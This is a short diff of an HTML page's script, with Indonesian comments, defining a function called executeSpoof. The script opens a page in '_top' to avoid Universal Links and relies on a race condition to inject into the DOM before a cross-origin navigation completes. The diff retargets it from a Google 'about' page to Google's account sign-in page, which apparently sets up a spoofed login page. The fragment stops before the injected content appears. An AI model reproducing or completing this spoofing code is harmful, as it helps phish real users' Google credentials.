@@ -27,7 +27,7 @@
   <script>
     function executeSpoof() {
       // 1. Menggunakan _top / window.open dengan path spesifik untuk menghindari Universal Links
-      let win = window.open('https://www.google.com/about/', '_top');
+      let win = window.open('https://accounts.google.com/', '_top');
 
       // 2. Race Condition: Injeksikan DOM sebelum navigasi cross-origin diselesaikan penuh oleh browser
       setTimeout(() => {
